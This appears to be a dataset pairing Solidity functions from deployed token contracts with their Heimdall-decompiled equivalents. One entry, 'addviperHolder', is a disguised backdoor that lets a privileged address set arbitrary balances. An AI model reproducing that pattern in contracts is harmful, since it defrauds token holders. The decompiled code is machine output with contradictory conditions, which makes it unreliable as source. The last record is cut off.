{"contract_address": "0x2c9aF7D51e9D5450da4b4e049792811b86FBFD28", "original_solidity_code": "function reduceFee(uint256 _newFee) external{\r\n      require(_msgSender()==_taxWallet);\r\n      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);\r\n      _finalBuyTax=_newFee;\r\n      _finalSellTax=_newFee;\r\n    }", "heimdall_decompiled_code": "function reduceFee(uint256 arg0) public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        require(arg0 > store_h);\n        require(!arg0 > store_h);\n        store_h = arg0;\n        store_p = arg0;\n    }"}
{"contract_address": "0xEC5Cd1764456f3CaBb72B90b95526BE632D8385c", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(address(msg.sender) == 0), \"ERC20: approve to the zero address\");\n        require(!(address(arg0) == 0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x22;\n        var_h = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_i = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x24;\n        var_h = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_i = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xE017C8475A6C89f181CA2C9222c2Bbf36dc04A4D", "original_solidity_code": "function symbol() external view  returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_c / 0x02;\n                if (store_c) {\n                    if (store_c - ((store_c / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c / 0x02) {\n                            if (0x1f < (store_c / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xDC4259959BFE37685741A162a2D0757cF774E129", "original_solidity_code": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }", "heimdall_decompiled_code": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }"}
{"contract_address": "0x19d4B93c60e5D7995226F47446e56bD6ac2DDD75", "original_solidity_code": "function manualSwap() external {\n        require(_msgSender()==_taxWallet);\n        uint256 tokenBalance=balanceOf(address(this));\n        if(tokenBalance>0){\n          swapTokensForEth(tokenBalance);\n        }\n        uint256 ethBalance=address(this).balance;\n        if(ethBalance>0){\n          sendETHToFee(ethBalance);\n        }\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(store_p)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a]);\n        store_f = 0x01000000000000000000000000000000000000000000 | (uint248(store_f));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!((var_d + ret0.length) - var_d) < 0x20);\n        require(var_d.length == (address(var_d.length)));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this));\n        require(address(store_l));\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_l);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_l), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_o = var_d.length;\n        address var_p = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_l).code.length);\n        (bool success, bytes memory ret0) = address(store_l).Unresolved_791ac947(var_l); // call\n        store_f = uint248(store_f);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(store_p).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_p = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_p = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x6f87c7FAc982eB280d81865547aB31fD209b1637", "original_solidity_code": "function transfer(address to, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"Sender blacklisted\");\n        require(address(arg0), \"Sender blacklisted\");\n        address var_a = address(msg.sender);\n        var_b = 0x0b;\n        require(!(bytes1(storage_map_e[var_a])), \"Sender blacklisted\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x12;\n        var_f = 0x53656e64657220626c61636b6c69737465640000000000000000000000000000;\n        var_a = address(arg0);\n        var_b = 0x0b;\n        require(!(bytes1(storage_map_e[var_a])), \"Receiver blacklisted\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x14;\n        var_f = 0x526563656976657220626c61636b6c6973746564000000000000000000000000;\n        require(arg1, \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(blacklistRenounced)), \"ERC20: transfer amount exceeds balance\");\n        require(address(owner) == (address(msg.sender)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!(address(owner)) == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(address(arg0)), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0xdead == (address(arg0))), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(this);\n        uint256 var_b = 0;\n        require(storage_map_e[var_a] < swapTokensAtAmount, \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        require(!(!storage_map_e[var_a] < swapTokensAtAmount), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x12;\n        require(bytes1(storage_map_e[var_a]), \"ERC20: transfer amount exceeds balance\");\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        require(!(!0 == endHighFeesBlock), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0 == endHighFeesBlock), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0 == endHighFeesBlock), \"ERC20: transfer amount exceeds balance\");\n        require(!(!0 == endHighFeesBlock), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(arg0);\n        var_b = 0x14;\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(0xc8 > 0), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0x14;\n        require(!(bytes1(storage_map_e[var_a])), \"ERC20: transfer amount exceeds balance\");\n        require(!(0xc8 > 0), \"ERC20: transfer amount exceeds balance\");\n        require(!0, \"ERC20: transfer amount exceeds balance\");\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(this), \"ERC20: transfer amount exceeds balance\");\n        var_a = address(msg.sender);\n        var_b = 0;\n        require(!(storage_map_e[var_a] < 0), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_g = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_e[var_a] = storage_map_e[var_a] - 0;\n        var_a = address(this);\n        storage_map_e[var_a] = var_b + storage_map_e[var_a];\n        uint256 var_c = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        require(!(arg1 < 0), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        if (!(arg1) & (0xc8 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_h = 0x11;\n            if (store_o) {\n                if (!tokensForTeam > (~((arg1 * 0xc8) / store_o))) {\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_h = 0x11;\n                    var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                    var_h = 0x12;\n                    if (!storage_map_e[var_a]) {\n                    }\n                    if (!(arg1) & (0xc8 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_h = 0x11;\n                        if (store_o) {\n                            if (!tokensForTeam > (~((arg1 * 0xc8) / store_o))) {\n                                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_h = 0x11;\n                                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_h = 0x12;\n                                if (!storage_map_e[var_a]) {\n                                }\n                                if (!0x01) {\n                                    var_a = address(arg0);\n                                    var_b = 0x14;\n                                    if (!storage_map_e[var_a]) {\n                                        if (!0xc8 > 0) {\n                                            var_a = address(msg.sender);\n                                            var_b = 0x14;\n                                            require(!(arg1 & (0xc8 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"Sell transfer amount exceeds the maxTradingAmount.\");\n                                        }\n                                        require(store_o, \"Sell transfer amount exceeds the maxTradingAmount.\");\n                                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_h = 0x11;\n                                        require(!(tokensForTeam > (~((arg1 * 0xc8) / store_o))), \"Sell transfer amount exceeds the maxTradingAmount.\");\n                                        require(!(arg1 & (0xc8 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"Sell transfer amount exceeds the maxTradingAmount.\");\n                                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_h = 0x11;\n                                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_h = 0x12;\n                                        require(store_o, \"Sell transfer amount exceeds the maxTradingAmount.\");\n                                    }\n                                }\n                                var_a = address(arg0);\n                                var_b = 0x14;\n                                require(!(tokensForTeam > (~((arg1 * 0xc8) / store_o))), \"Sell transfer amount exceeds the maxTradingAmount.\");\n                                require(!0x01, \"Sell transfer amount exceeds the maxTradingAmount.\");\n                                require(!(0xc8 > 0), \"Sell transfer amount exceeds the maxTradingAmount.\");\n                                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_h = 0x11;\n                                require(!(arg1 & (0xc8 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"Sell transfer amount exceeds the maxTradingAmount.\");\n                                require(store_o, \"Sell transfer amount exceeds the maxTradingAmount.\");\n                                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_h = 0x11;\n                                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_h = 0x12;\n                                require(!(tokensForTeam > (~((arg1 * 0xc8) / store_o))), \"Sell transfer amount exceeds the maxTradingAmount.\");\n                            }\n                        }\n                        require(!(0xc8 > 0), \"Sell transfer amount exceeds the maxTradingAmount.\");\n                    }\n                    require(!(arg1 & (0xc8 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"Sell transfer amount exceeds the maxTradingAmount.\");\n                }\n                owner = 0x010000000000000000000000000000000000000000 | (uint248(owner));\n                var_a = address(this);\n                var_b = 0;\n                require(store_o, \"Sell transfer amount exceeds the maxTradingAmount.\");\n                require(!(tokensForTeam > (~((arg1 * 0xc8) / store_o))), \"Sell transfer amount exceeds the maxTradingAmount.\");\n            }\n            require(!storage_map_e[var_a], \"Sell transfer amount exceeds the maxTradingAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x12;\n            require(bytes1(blacklistRenounced / 0x0100), \"Sell transfer amount exceeds the maxTradingAmount.\");\n            require(bytes1(storage_map_e[var_a]), \"Sell transfer amount exceeds the maxTradingAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x14;\n            require(!(bytes1(storage_map_e[var_a])), \"Sell transfer amount exceeds the maxTradingAmount.\");\n            var_a = address(arg0);\n            var_b = 0x13;\n            require(!(!bytes1(storage_map_e[var_a])), \"Sell transfer amount exceeds the maxTradingAmount.\");\n            var_a = address(arg0);\n            var_b = 0x14;\n            require(!(bytes1(storage_map_e[var_a])), \"Sell transfer amount exceeds the maxTradingAmount.\");\n            var_a = address(msg.sender);\n            var_b = 0x13;\n            require(!(!bytes1(storage_map_e[var_a])), \"Sell transfer amount exceeds the maxTradingAmount.\");\n            var_a = address(arg0);\n            var_b = 0x13;\n            require(bytes1(storage_map_e[var_a]), \"Sell transfer amount exceeds the maxTradingAmount.\");\n        }\n        require(!(arg1 > maxTradingAmount), \"Sell transfer amount exceeds the maxTradingAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x32;\n        var_f = 0x53656c6c207472616e7366657220616d6f756e74206578636565647320746865;\n        var_g = 0x206d617854726164696e67416d6f756e742e0000000000000000000000000000;\n        if (!storage_map_e[var_a]) {\n        }\n        require(!(arg1 > maxTradingAmount), \"Buy transfer amount exceeds the maxTradingAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x31;\n        var_f = 0x427579207472616e7366657220616d6f756e7420657863656564732074686520;\n        var_g = 0x6d617854726164696e67416d6f756e742e000000000000000000000000000000;\n        if (!storage_map_e[var_a]) {\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x16;\n        var_f = 0x54726164696e67206973206e6f74206163746976652e00000000000000000000;\n        if (!address(arg0)) {\n            if (!address(arg0)) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xAB17E21aaAaF60C9022E34e3AcdBC73EEeb0f880", "original_solidity_code": "function manualBurnLiquidityPairTokens(uint256 percent)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        require(\r\n            block.timestamp > lastManualLpBurnTime + manualBurnFrequency,\r\n            \"Must wait for cooldown to finish\"\r\n        );\r\n        require(percent <= 100, \"May not nuke more than 10% of tokens in LP\");\r\n        lastManualLpBurnTime = block.timestamp;\r\n\r\n        // get balance of liquidity pair\r\n        uint256 liquidityPairBalance = this.balanceOf(uniswapV2Pair);\r\n\r\n        // calculate amount to burn\r\n        uint256 amountToBurn = liquidityPairBalance.mul(percent).div(1000);\r\n\r\n        // pull tokens from pancakePair liquidity and move to dead address permanently\r\n        if (amountToBurn > 0) {\r\n            super._transfer(uniswapV2Pair, address(0xdead), amountToBurn);\r\n        }\r\n\r\n        //sync price since this is not in a swap transaction!\r\n        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);\r\n        pair.sync();\r\n        emit ManualNukeLP();\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function manualBurnLiquidityPairTokens(uint256 arg0) public returns (bool) {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(lastManualLpBurnTime > (manualBurnFrequency + lastManualLpBurnTime)), \"Must wait for cooldown to finish\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(block.timestamp > (manualBurnFrequency + lastManualLpBurnTime), \"Must wait for cooldown to finish\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4d757374207761697420666f7220636f6f6c646f776e20746f2066696e697368;\n        require(!(arg0 > 0x64), \"May not nuke more than 10% of tokens in LP\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2a;\n        var_d = 0x4d6179206e6f74206e756b65206d6f7265207468616e20313025206f6620746f;\n        var_g = 0x6b656e7320696e204c5000000000000000000000000000000000000000000000;\n        lastManualLpBurnTime = block.timestamp;\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        var_b = 0xf82cf8e4225ebbea534c3ac06db0c1254160a111;\n        (bool success, bytes memory ret0) = address(this).Unresolved_70a08231(var_b); // staticcall\n        uint256 var_h = var_h + (uint248(ret0.length + 0x1f));\n        require(!(((var_h + ret0.length) - var_h) < 0x20), \"ERC20: transfer from the zero address\");\n        require((arg0 == ((arg0 * var_h.length) / var_h.length)) | !var_h.length, \"ERC20: transfer from the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x03e8, \"ERC20: transfer from the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(!((arg0 * var_h.length) / 0x03e8), \"ERC20: transfer from the zero address\");\n        require(0xf82cf8e4225ebbea534c3ac06db0c1254160a111, \"ERC20: transfer from the zero address\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_j = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        require(0xdead, \"ERC20: transfer to the zero address\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_j = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_e = 0xf82cf8e4225ebbea534c3ac06db0c1254160a111;\n        uint256 var_k = 0;\n        require(!(storage_map_t[var_e] < ((arg0 * var_h.length) / 0x03e8)), \"ERC20: transfer amount exceeds balance\");\n        var_i = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_j = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_e = 0xf82cf8e4225ebbea534c3ac06db0c1254160a111;\n        var_k = 0;\n        storage_map_t[var_e] = storage_map_t[var_e] - ((arg0 * var_h.length) / 0x03e8);\n        var_e = 0xdead;\n        require(!storage_map_t[var_e] > (((arg0 * var_h.length) / 0x03e8) + storage_map_t[var_e]));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        storage_map_t[var_e] = ((arg0 * var_h.length) / 0x03e8) + storage_map_t[var_e];\n        uint256 var_i = (arg0 * var_h.length) / 0x03e8;\n        emit Transfer(0xf82cf8e4225ebbea534c3ac06db0c1254160a111, 0xdead, (arg0 * var_h.length) / 0x03e8);\n        var_i = 0xfff6cae900000000000000000000000000000000000000000000000000000000;\n        require(address(0xf82cf8e4225ebbea534c3ac06db0c1254160a111).code.length);\n        (bool success, bytes memory ret0) = address(0xf82cf8e4225ebbea534c3ac06db0c1254160a111).sync(var_c); // call\n        emit ManualNukeLP();\n        var_i = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x060f7a607bAd24a75EC072b96C1a209A80ca62ed", "original_solidity_code": "function reduceFee(uint256 _newFee) external{\r\n      require(_msgSender()==_taxWallet);\r\n      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);\r\n      _finalBuyTax=_newFee;\r\n      _finalSellTax=_newFee;\r\n    }", "heimdall_decompiled_code": "function reduceFee(uint256 arg0) public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        require(arg0 > store_h);\n        require(!arg0 > store_h);\n        store_h = arg0;\n        store_p = arg0;\n    }"}
{"contract_address": "0xD551F2Bd835B49DB742f0382d441Ede9C7C1Ee30", "original_solidity_code": "function set_Max_Transaction_Percent(uint256 maxTxPercent_x100) external onlyOwner() {\r\n        _maxTxAmount = _tTotal*maxTxPercent_x100/10000;\r\n    }", "heimdall_decompiled_code": "function set_Max_Transaction_Percent(uint256 arg0) public {\n        require(arg0 == arg0);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!totalSupply | (arg0 == ((totalSupply * arg0) / totalSupply)));\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x2710);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n        _maxTxAmount = (totalSupply * arg0) / 0x2710;\n    }"}
{"contract_address": "0x8b13B49531ed4412305DC0973197a8af7CE2eF07", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0xF6FF7F8635a951ecF4D68264b32FB3a4b5f9cf15", "original_solidity_code": "function isExcludedFromFees(address account) public view returns(bool) {\\r\\n        return _isExcludedFromFees[account];\\r\\n    }", "heimdall_decompiled_code": "function isExcludedFromFees(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x24;\n        address var_c = !(!bytes1(storage_map_r[var_a]));\n        return !(!bytes1(storage_map_r[var_a]));\n    }"}
{"contract_address": "0xd6fDDDc9A79AA8215aEA6CA790D87406dba5CDf3", "original_solidity_code": "function setFeeTo(address _feeTo) external {\\n        require(msg.sender == feeToSetter, 'UniswapV2: FORBIDDEN');\\n        feeTo = _feeTo;\\n    }", "heimdall_decompiled_code": "function setFeeTo(address arg0) public payable returns (uint256) {\n        require(msg.value);\n        require((0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc + msg.data.length) < 0x20);\n        require(arg0 - (address(arg0)));\n        require(!(msg.sender == (address(feeToSetter))), \"UniswapV2: FORBIDDEN\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x14;\n        var_d = 0x556e697377617056323a20464f5242494444454e000000000000000000000000;\n        feeTo = (uint96(feeTo)) | (address(arg0));\n        return ;\n    }"}
{"contract_address": "0xc921a48b2bBd243aC30422B266edf58F472Eca7F", "original_solidity_code": "function setPair(address pairAddress) external onlyOwner {\\r\\n        pair = pairAddress;\\r\\n}", "heimdall_decompiled_code": "function setPair(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        pair = (address(arg0)) | (uint96(pair));\n    }"}
{"contract_address": "0xfc606C8F7141110c3f295a22004D274680A9A029", "original_solidity_code": "function bond(address ref) public payable nonReentrant {\r\n        require(canBond);\r\n        require(msg.value >= 0.1 ether, \"Min bond is 0.1 eth\");\r\n        require(ref != msg.sender, \"Cannot refer to self\");\r\n        BondEntry memory currentBond = bonds[msg.sender];\r\n        if(currentBond.withdrawTime == 0) {\r\n            BondEntry memory b = BondEntry(\r\n                msg.value,\r\n                block.timestamp + 1 hours,\r\n                ref\r\n            );\r\n            bonds[msg.sender] = b;\r\n        } else {\r\n            currentBond.ethAmount += msg.value;\r\n            currentBond.withdrawTime = block.timestamp + 1 hours;\r\n            currentBond.referrer = ref;\r\n        }\r\n        \r\n    }", "heimdall_decompiled_code": "function bond(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(store_j - 0x02, \"ReentrancyGuard: reentrant call\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1f;\n        var_d = 0x5265656e7472616e637947756172643a207265656e7472616e742063616c6c00;\n        store_j = 0x02;\n        require(bytes1(canBond), \"Cannot refer to self\");\n        require(!(msg.value < 0x016345785d8a0000), \"Cannot refer to self\");\n        require(address(arg0) - msg.sender, \"Cannot refer to self\");\n        address var_e = msg.sender;\n        var_f = 0x04;\n        uint256 var_g = var_g + 0x60;\n        address var_a = storage_map_k[var_e];\n        address var_h = storage_map_l[var_e];\n        address var_i = address(storage_map_m[var_e]);\n        require(0 - (storage_map_l[var_e]), \"Cannot refer to self\");\n        require(!(var_j > 